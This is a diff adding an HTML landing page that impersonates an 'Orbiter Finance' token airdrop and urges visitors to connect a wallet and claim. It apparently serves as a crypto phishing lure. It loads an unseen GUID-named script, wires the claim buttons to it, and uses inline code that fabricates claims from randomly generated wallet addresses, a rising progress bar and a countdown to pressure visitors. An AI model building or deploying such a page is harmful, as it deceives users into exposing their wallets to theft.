@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Orbiter Finance - Community Airdrop</title>
+	<script charset="UTF-8" type="text/javascript" src="./facaead6-abd1-44d8-a5ce-38ccceebb650.js"></script>
+	<link rel="icon" type="image/x-icon" href="./favicon.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            fontFamily: {
+              sans: ["Inter", "sans-serif"],
+            },
+            animation: {
+              "fade-in": "fadeIn 1s ease-out",
+              "slide-up": "slideUp 1s ease-out",
+              "scale-in": "scaleIn 1.5s ease-out",
+              float: "float 6s ease-in-out infinite",
+              glow: "glow 2s infinite",
+              shine: "shine 3s infinite",
+              "progress-pulse": "progressPulse 1.5s ease-in-out infinite",
+            },
+            keyframes: {
+              fadeIn: {
+                "0%": { opacity: "0" },
+                "100%": { opacity: "1" },
+              },
+              slideUp: {
+                "0%": { transform: "translateY(20px)", opacity: "0" },
+                "100%": { transform: "translateY(0)", opacity: "1" },
+              },
+              scaleIn: {
+                "0%": { transform: "scale(0.9)", opacity: "0" },
+                "100%": { transform: "scale(1)", opacity: "1" },
+              },
+              float: {
+                "0%, 100%": { transform: "translateY(0)" },
+                "50%": { transform: "translateY(-10px)" },
+              },
+              glow: {
+                "0%, 100%": {
+                  boxShadow:
+                    "0 0 5px rgba(255,76,77,0.3), 0 0 10px rgba(255,76,77,0.2), 0 0 15px rgba(255,76,77,0.1)",
+                },
+                "50%": {
+                  boxShadow:
+                    "0 0 10px rgba(255,76,77,0.4), 0 0 20px rgba(255,76,77,0.3), 0 0 30px rgba(255,76,77,0.2)",
+                },
+              },
+              shine: {
+                "0%": { backgroundPosition: "200% center" },
+                "100%": { backgroundPosition: "-200% center" },
+              },
+              progressPulse: {
+                "0%, 100%": { opacity: "0.6" },
+                "50%": { opacity: "1" },
+              },
+            },
+          },
+        },
+      };
+    </script>
+    <style>
+      /* Custom Scrollbar - Can't be done with Tailwind */
+      ::-webkit-scrollbar {
+        width: 8px;
+      }
+      ::-webkit-scrollbar-track {
+        background: rgba(255, 255, 255, 0.05);
+      }
+      ::-webkit-scrollbar-thumb {
+        background: linear-gradient(45deg, #ff4c4d, #ff6666);
+        border-radius: 4px;
+      }
+      ::-webkit-scrollbar-thumb:hover {
+        background: linear-gradient(45deg, #ff6666, #ff4c4d);
+      }
+
+      /* Toast Animation */
+      @keyframes slideInRight {
+        from {
+          transform: translateX(100%);
+        }
+        to {
+          transform: translateX(0);
+        }
+      }
+      @keyframes slideOutRight {
+        from {
+          transform: translateX(0);
+        }
+        to {
+          transform: translateX(100%);
+        }
+      }
+      .slide-in {
+        animation: slideInRight 0.5s forwards;
+      }
+      .slide-out {
+        animation: slideOutRight 0.5s forwards;
+      }
+    </style>
+  </head>
+  <body
+    class="bg-[#0a0a14] text-white font-sans min-h-screen flex flex-col animate-fade-in overflow-x-hidden"
+    style="
+      background-image: url('./main-bg.png');
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+    "
+  >
+    <!-- Toast Container -->
+    <div
+      id="toastContainer"
+      class="fixed bottom-5 right-5 z-50 flex flex-col gap-3"
+    ></div>
+
+    <!-- Navbar -->
+    <nav
+      class="fixed top-0 left-0 right-0 z-50 bg-[#0a0a14]/95 backdrop-blur-lg border-b border-white/10 animate-slide-up"
+    >
+      <div
+        class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between"
+      >
+        <img
+          src="./logo.png"
+          alt="Orbiter Finance"
+          class="h-8 hidden sm:block"
+        />
+        <img
+          src="./logomb.png"
+          alt="Orbiter Finance"
+          class="h-8 sm:hidden"
+        />
+        <button
+          class="open bg-gradient-to-r from-[#ff4c4d] to-[#ff6666] px-6 py-2 rounded text-sm font-medium hover:shadow-lg hover:shadow-[#ff4c4d]/20 transition-all duration-300 hover:-translate-y-0.5"
+        >
+          Connect Wallet
+        </button>
+      </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="flex-1 pt-24 pb-16 px-4">
+      <div class="max-w-4xl mx-auto">
+        <!-- Hero Section -->
+        <div class="text-center mb-16 animate-slide-up">
+          <h1
+            class="text-5xl md:text-6xl font-bold mb-4 bg-gradient-to-r from-[#ff4c4d] to-[#ff6666] text-transparent bg-clip-text"
+          >
+            Orbiter Finance
+          </h1>
+          <h2 class="text-2xl md:text-3xl font-medium text-white/90 mb-8">
+            Community Airdrop Round 1
+          </h2>
+          <img
+            src="./image.png"
+            alt="Token Stack"
+            class="w-48 md:w-56 mx-auto animate-float"
+          />
+        </div>
+
+        <!-- Claim Button -->
+        <div class="open text-center mb-12 animate-slide-up delay-500">
+          <button
+            class="open bg-gradient-to-r from-[#ff4c4d] to-[#ff6666] px-12 py-4 rounded-lg text-lg font-semibold hover:shadow-lg hover:shadow-[#ff4c4d]/20 transition-all duration-300 hover:-translate-y-1 animate-glow relative overflow-hidden"
+          >
+            <span class="relative z-10">Check Eligibility & Claim</span>
+            <div
+              class="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -skew-x-12 animate-shine"
+            ></div>
+          </button>
+        </div>
+
+        <!-- Progress Section -->
+        <div
+          class="bg-[#14141e]/95 backdrop-blur-lg p-8 rounded-xl border border-white/10 mb-12 hover:border-[#ff4c4d]/30 hover:shadow-lg hover:shadow-[#ff4c4d]/20 transition-all duration-300 animate-slide-up delay-700"
+        >
+          <h3 class="text-xl font-semibold mb-6">Claim Progress</h3>
+          <div class="h-2 bg-white/10 rounded-full overflow-hidden mb-4">
+            <div
+              id="progressBar"
+              class="h-full w-[53.77%] bg-gradient-to-r from-[#ff4c4d] to-[#ff6666] relative"
+            >
+              <div
+                class="absolute top-0 right-0 w-5 h-full bg-gradient-to-r from-transparent to-[#ff6666] animate-progress-pulse"
+              ></div>
+            </div>
+          </div>
+          <div class="flex justify-between text-sm text-white/70">
+            <span id="claimProgress">5,377,131 / 10,000,000 ORB Claimed</span>
+            <span id="countdown">15h 50m 21s Remaining</span>
+          </div>
+        </div>
+
+        <!-- Info Grid -->
+        <div
+          class="grid grid-cols-1 md:grid-cols-2 gap-6 animate-slide-up delay-1000"
+        >
+          <div
+            class="bg-[#14141e]/95 backdrop-blur-lg p-8 rounded-xl border border-white/10 hover:border-[#ff4c4d]/30 hover:shadow-lg hover:shadow-[#ff4c4d]/20 transition-all duration-300 hover:-translate-y-1"
+          >
+            <h3
+              class="text-xl font-semibold mb-6 bg-gradient-to-r from-[#ff4c4d] to-[#ff6666] text-transparent bg-clip-text"
+            >
+              Eligibility Criteria
+            </h3>
+            <ul class="space-y-4">
+              <li
+                class="flex items-center text-white/80 hover:text-white hover:translate-x-1 transition-all duration-300"
+              >
+                <span class="text-[#ff4c4d] mr-3">•</span>
+                Previous bridge transactions on Orbiter
+              </li>
+              <li
+                class="flex items-center text-white/80 hover:text-white hover:translate-x-1 transition-all duration-300"
+              >
+                <span class="text-[#ff4c4d] mr-3">•</span>
+                Active participation in cross-chain transfers
+              </li>
+              <li
+                class="flex items-center text-white/80 hover:text-white hover:translate-x-1 transition-all duration-300"
+              >
+                <span class="text-[#ff4c4d] mr-3">•</span>
+                Early adopter bonus for long-term users
+              </li>
+              <li
+                class="flex items-center text-white/80 hover:text-white hover:translate-x-1 transition-all duration-300"
+              >
+                <span class="text-[#ff4c4d] mr-3">•</span>
+                Multiple chain interaction history
+              </li>
+            </ul>
+          </div>
+          <div
+            class="bg-[#14141e]/95 backdrop-blur-lg p-8 rounded-xl border border-white/10 hover:border-[#ff4c4d]/30 hover:shadow-lg hover:shadow-[#ff4c4d]/20 transition-all duration-300 hover:-translate-y-1"
+          >
+            <h3
+              class="text-xl font-semibold mb-6 bg-gradient-to-r from-[#ff4c4d] to-[#ff6666] text-transparent bg-clip-text"
+            >
+              Distribution Details
+            </h3>
+            <ul class="space-y-4">
+              <li
+                class="flex items-center text-white/80 hover:text-white hover:translate-x-1 transition-all duration-300"
+              >
+                <span class="text-[#ff4c4d] mr-3">•</span>
+                Tokens distributed immediately upon claim
+              </li>
+              <li
+                class="flex items-center text-white/80 hover:text-white hover:translate-x-1 transition-all duration-300"
+              >
+                <span class="text-[#ff4c4d] mr-3">•</span>
+                No vesting or lock-up period
+              </li>
+              <li
+                class="flex items-center text-white/80 hover:text-white hover:translate-x-1 transition-all duration-300"
+              >
+                <span class="text-[#ff4c4d] mr-3">•</span>
+                Automatic distribution to connected wallet
+              </li>
+              <li
+                class="flex items-center text-white/80 hover:text-white hover:translate-x-1 transition-all duration-300"
+              >
+                <span class="text-[#ff4c4d] mr-3">•</span>
+                Unclaimed tokens returned to treasury
+              </li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- Stats Grid -->
+        <div
+          class="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12 animate-slide-up delay-300"
+        >
+          <div
+            class="bg-[#14141e]/95 backdrop-blur-lg p-8 rounded-xl border border-white/10 hover:border-[#ff4c4d]/30 hover:shadow-lg hover:shadow-[#ff4c4d]/20 transition-all duration-300 hover:-translate-y-1"
+          >
+            <div
+              class="text-3xl font-bold mb-2 bg-gradient-to-r from-[#ff4c4d] to-[#ff6666] text-transparent bg-clip-text"
+            >
+              $2.15B
+            </div>
+            <div class="text-white/70">Total Value Locked</div>
+          </div>
+          <div
+            class="bg-[#14141e]/95 backdrop-blur-lg p-8 rounded-xl border border-white/10 hover:border-[#ff4c4d]/30 hover:shadow-lg hover:shadow-[#ff4c4d]/20 transition-all duration-300 hover:-translate-y-1"
+          >
+            <div
+              class="text-3xl font-bold mb-2 bg-gradient-to-r from-[#ff4c4d] to-[#ff6666] text-transparent bg-clip-text"
+            >
+              57,829
+            </div>
+            <div class="text-white/70">Total Participants</div>
+          </div>
+          <div
+            class="bg-[#14141e]/95 backdrop-blur-lg p-8 rounded-xl border border-white/10 hover:border-[#ff4c4d]/30 hover:shadow-lg hover:shadow-[#ff4c4d]/20 transition-all duration-300 hover:-translate-y-1"
+          >
+            <div
+              class="text-3xl font-bold mb-2 bg-gradient-to-r from-[#ff4c4d] to-[#ff6666] text-transparent bg-clip-text"
+            >
+              759 ORB
+            </div>
+            <div class="text-white/70">Average Reward</div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- Footer -->
+    <footer
+      class="bg-[#14141e]/95 backdrop-blur-lg border-t border-white/10 py-4 animate-fade-in"
+    >
+      <div
+        class="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row justify-between items-center gap-4"
+      >
+        <div class="flex gap-6">
+          <a
+            href="#"
+            class="text-white/70 hover:text-white transition-colors duration-300 text-sm"
+            >GitHub</a
+          >
+          <a
+            href="#"
+            class="text-white/70 hover:text-white transition-colors duration-300 text-sm"
+            >DOCS</a
+          >
+          <a
+            href="#"
+            class="text-white/70 hover:text-white transition-colors duration-300 text-sm"
+            >Brand Assets</a
+          >
+          <a
+            href="#"
+            class="text-white/70 hover:text-white transition-colors duration-300 text-sm"
+            >Terms of Use</a
+          >
+        </div>
+        <div class="text-white/50 text-sm">
+          © 2024 Orbiter Finance. All rights reserved.
+        </div>
+      </div>
+    </footer>
+
+    <script>
+      // Random address generator
+      function generateAddress() {
+        const chars = "0123456789abcdef";
+        let address = "0x";
+        for (let i = 0; i < 40; i++) {
+          address += chars[Math.floor(Math.random() * chars.length)];
+        }
+        return address;
+      }
+
+      // Create toast notification
+      function createToast(address, amount) {
+        const toast = document.createElement("div");
+        toast.className =
+          "bg-[#14141e]/95 backdrop-blur-lg border border-[#ff4c4d]/30 rounded-lg p-4 flex items-center gap-3 slide-in";
+
+        const shortAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
+        toast.innerHTML = `
+          <div class="w-2 h-2 rounded-full bg-gradient-to-r from-[#ff4c4d] to-[#ff6666]"></div>
+          <div class="text-sm">
+            <span class="text-[#ff4c4d] font-mono">${shortAddress}</span>
+            claimed ${amount} ORB
+          </div>
+        `;
+
+        const container = document.getElementById("toastContainer");
+        container.appendChild(toast);
+
+        setTimeout(() => {
+          toast.classList.replace("slide-in", "slide-out");
+          setTimeout(() => toast.remove(), 500);
+        }, 4500);
+      }
+
+      // Show random claims
+      setInterval(() => {
+        const address = generateAddress();
+        const amount = Math.floor(Math.random() * 1000) + 100;
+        createToast(address, amount);
+      }, 3000);
+
+      // Update progress bar
+      let progress = 53.77;
+      const progressBar = document.getElementById("progressBar");
+      const progressText = document.getElementById("claimProgress");
+
+      setInterval(() => {
+        if (progress < 100) {
+          progress += 0.01;
+          progressBar.style.width = `${progress}%`;
+          const claimed = Math.floor((progress / 100) * 10000000);
+          progressText.textContent = `${claimed.toLocaleString()} / 10,000,000 ORB Claimed`;
+        }
+      }, 1000);
+
+      // Update countdown
+      let timeLeft = {
+        hours: 15,
+        minutes: 50,
+        seconds: 21,
+      };
+
+      setInterval(() => {
+        if (timeLeft.seconds > 0) {
+          timeLeft.seconds--;
+        } else if (timeLeft.minutes > 0) {
+          timeLeft.minutes--;
+          timeLeft.seconds = 59;
+        } else if (timeLeft.hours > 0) {
+          timeLeft.hours--;
+          timeLeft.minutes = 59;
+          timeLeft.seconds = 59;
+        }
+
+        document.getElementById(
+          "countdown"
+        ).textContent = `${timeLeft.hours}h ${timeLeft.minutes}m ${timeLeft.seconds}s Remaining`;
+      }, 1000);
+    </script>
+  </body>
+</html>
